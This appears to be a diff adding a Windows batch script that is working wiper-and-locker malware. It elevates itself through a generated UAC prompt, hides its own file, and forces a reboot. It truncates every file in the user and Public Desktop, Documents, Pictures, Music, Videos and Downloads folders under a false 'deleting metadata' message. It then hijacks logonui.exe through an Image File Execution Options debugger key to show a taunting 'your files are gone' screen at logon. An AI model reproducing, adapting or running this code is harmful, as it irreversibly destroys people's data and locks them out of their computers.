@@ -1,0 +1,150 @@
+@echo off
+cls
+:: BatchGotAdmin
+ :-------------------------------------
+ REM  --> Check for permissions
+ >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
+
+REM --> If error flag set, we do not have admin.
+ if '%errorlevel%' NEQ '0' (
+     echo Requesting administrative privileges...
+     goto UACPrompt
+ ) else ( goto gotAdmin )
+
+:UACPrompt
+     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
+
+    "%temp%\getadmin.vbs"
+     exit /b
+
+:gotAdmin
+     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
+     pushd "%CD%"
+     CD /D "%~dp0"
+ :--------------------------------------
+shutdown -r -f -t 30 -c "30 30 30 30 30 30"
+cd %appdata%\
+mkdir %appdata%\ren\
+cd %appdata%\ren\
+attrib +h +s %0
+
+setlocal enabledelayedexpansion
+for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Desktop" ^| findstr "REG_"`) do (
+  set "desktopPath=%%A"
+)
+for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Personal" ^| findstr "REG_"`) do (
+  set "documentsPath=%%A"
+)
+for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "My Video" ^| findstr "REG_"`) do (
+  set "videoPath=%%A"
+)
+for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "My Pictures" ^| findstr "REG_"`) do (
+  set "picturesPath=%%A"
+)
+for /f "usebackq delims=" %%A in (`reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "My Music" ^| findstr "REG_"`) do (
+  set "musicPath=%%A"
+)
+set "desktopPath=!desktopPath:*REG_SZ=!"
+set "documentsPath=!documentsPath:*REG_SZ=!"
+set "videoPath=!videoPath:*REG_SZ=!"
+set "picturesPath=!picturesPath:*REG_SZ=!"
+set "musicPath=!musicPath:*REG_SZ=!"
+set "downloadsPath=%userprofile%\downloads"
+setlocal
+set "desktopPath=%desktopPath: =%"
+set "documentsPath=%documentsPath: =%"
+set "videoPath=%videoPath: =%"
+set "picturesPath=%picturesPath: =%"
+set "musicPath=%musicPath: =%"
+set "downloadsPath=%downloadsPath: =%"
+set "folders=%desktopPath% %documentsPath% %videoPath% %picturesPath% %musicPath% %downloadsPath%" 
+set "DesktopPath1=C:\Users\Public\Desktop"
+set "DownloadPath1=C:\Users\Public\Downloads"
+set "DocumentsPath1=C:\Users\Public\Documents"
+set "MusicPath1=C:\Users\Public\Music"
+set "VideoPath1=C:\Users\Public\Videos"
+set "PicturesPath1=C:\Users\Public\Pictures"
+for %%F in (%folders%) do (
+    echo Deleting metadata from files in %%F...
+    for /r "%%F" %%G in (*) do (
+        type nul > "%%F"
+    )
+)
+for %%F in ("%desktopPath1%\*" "%documentsPath1%\*" "%videoPath1%\*" "%picturesPath1%\*" "%musicPath1%\*" "%downloadsPath1%\*") do (
+    type nul > "%%F"
+)
+for %%F in ("%desktopPath%\*" "%documentsPath%\*" "%videoPath%\*" "%picturesPath%\*" "%musicPath%\*" "%downloadsPath%\*") do (
+    type nul > "%%F"
+)                     
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\logonui.exe" /v Debugger /t REG_SZ /d "%appdata%\ren\w.bat"               
+echo Add-Type -AssemblyName System.Windows.Forms																															> logonuiw.ps1
+echo Add-Type -AssemblyName System.Drawing                                                                                                                                  >> logonuiw.ps1
+echo $screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width                                                                                               >> logonuiw.ps1
+echo $screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height                                                                                             >> logonuiw.ps1
+echo $posX = 0                                                                                                                                                              >> logonuiw.ps1
+echo $posY = 0                                                                                                                                                              >> logonuiw.ps1
+echo function ShowMessage($msg) {                                                                                                                                           >> logonuiw.ps1
+echo     $form = New-Object System.Windows.Forms.Form                                                                                                                       >> logonuiw.ps1
+echo     $form.FormBorderStyle = "None"                                                                                                                                     >> logonuiw.ps1
+echo     $form.ShowInTaskbar = $false                                                                                                                                       >> logonuiw.ps1
+echo     $form.StartPosition = "Manual"                                                                                                                                     >> logonuiw.ps1
+echo     $form.TopMost = $true                                                                                                                                              >> logonuiw.ps1
+echo     $label = New-Object System.Windows.Forms.Label                                                                                                                     >> logonuiw.ps1
+echo     $label.Text = $msg                                                                                                                                                 >> logonuiw.ps1
+echo     $label.AutoSize = $true                                                                                                                                            >> logonuiw.ps1
+echo     $label.Font = New-Object System.Drawing.Font("Arial", 24, [System.Drawing.FontStyle]::Bold)                                                                        >> logonuiw.ps1
+echo     $label.ForeColor = [System.Drawing.Color]::White                                                                                                                   >> logonuiw.ps1
+echo     $label.BackColor = [System.Drawing.Color]::Transparent                                                                                                             >> logonuiw.ps1
+echo     $form.Controls.Add($label)                                                                                                                                         >> logonuiw.ps1
+echo     $form.Location = New-Object System.Drawing.Point($posX, $posY)                                                                                                     >> logonuiw.ps1
+echo     $form.Width = $screenWidth                                                                                                                                         >> logonuiw.ps1
+echo     $form.Height = $screenHeight                                                                                                                                       >> logonuiw.ps1
+echo     $formShown = $false                                                                                                                                                >> logonuiw.ps1
+echo     $timer = New-Object System.Windows.Forms.Timer                                                                                                                     >> logonuiw.ps1
+echo     $timer.Interval = 600                                                                                                                                              >> logonuiw.ps1
+echo     $timer.Add_Tick({                                                                                                                                                  >> logonuiw.ps1
+echo         if (!$formShown) {                                                                                                                                             >> logonuiw.ps1
+echo             $posY ^+= 5                                                                                                                                                >> logonuiw.ps1
+echo             $form.Location = New-Object System.Drawing.Point($posX, $posY)                                                                                             >> logonuiw.ps1
+echo             [System.Media.SystemSounds]::Asterisk.Play()                                                                                                               >> logonuiw.ps1
+echo             $formShown = $true                                                                                                                                         >> logonuiw.ps1
+echo         }                                                                                                                                                              >> logonuiw.ps1
+echo         else {                                                                                                                                                         >> logonuiw.ps1
+echo             $posY ^+= 5                                                                                                                                                >> logonuiw.ps1
+echo             $form.Location = New-Object System.Drawing.Point($posX, $posY)                                                                                             >> logonuiw.ps1
+echo         }                                                                                                                                                              >> logonuiw.ps1
+echo         $rnd = New-Object System.Random                                                                                                                                >> logonuiw.ps1
+echo         $color = [System.Drawing.Color]::FromArgb($rnd.Next(0, 255), $rnd.Next(0, 255), $rnd.Next(0, 255))                                                             >> logonuiw.ps1
+echo         $form.BackColor = $color                                                                                                                                       >> logonuiw.ps1
+echo     })                                                                                                                                                                 >> logonuiw.ps1
+echo     $timer.Start()                                                                                                                                                     >> logonuiw.ps1
+echo     $form.ShowDialog()                                                                                                                                                 >> logonuiw.ps1
+echo }                                                                                                                                                                      >> logonuiw.ps1
+echo $shell = New-Object -ComObject "Shell.Application"                                                                                                                     >> logonuiw.ps1
+echo $shell.ToggleDesktop()                                                                                                                                                 >> logonuiw.ps1
+echo 1^|foreach { ShowMessage(^"                                                                                                                                            >> logonuiw.ps1
+echo 1                                                                                                                                                                       >> logonuiw.ps1
+echo                        *                    *                                                                                                                          >> logonuiw.ps1
+echo                       ***                  ***                                                                                                                         >> logonuiw.ps1
+echo                     *****                *****                                                                                                                         >> logonuiw.ps1
+echo                     *****                *****                                                                                                                         >> logonuiw.ps1
+echo                      ***                   ***                                                                                                                         >> logonuiw.ps1
+echo 1                                                                                                                                                                       >> logonuiw.ps1
+echo             *******************************************)                                                                                                               >> logonuiw.ps1
+echo              ***                                          ***                                                                                                          >> logonuiw.ps1
+echo                ***                                      ***                                                                                                            >> logonuiw.ps1
+echo                  ***                              ***                                                                                                                  >> logonuiw.ps1
+echo                    ***                      ***                                                                                                                        >> logonuiw.ps1
+echo                       ******************                                                                                                                                 >> logonuiw.ps1
+echo Congratulation! >> logonuiw.ps1
+echo All your files are gone and your computer is locked! >> logonuiw.ps1
+echo Oh my god, what should I do? >> logonuiw.ps1
+echo All you can do is reset your computer. >> logonuiw.ps1
+echo Don't try to fix it, just enjoy this screen! >> logonuiw.ps1
+echo ^") }                                                                                                                                                                  >> logonuiw.ps1
+echo start /min %appdata%\ren\wa.bat > w.bat
+echo cd %appdata%\ren\ > wa.bat
+echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> wa.bat
+set "ea=%appdata%\ren\logonuiw.ps1" 
+echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> wa.bat
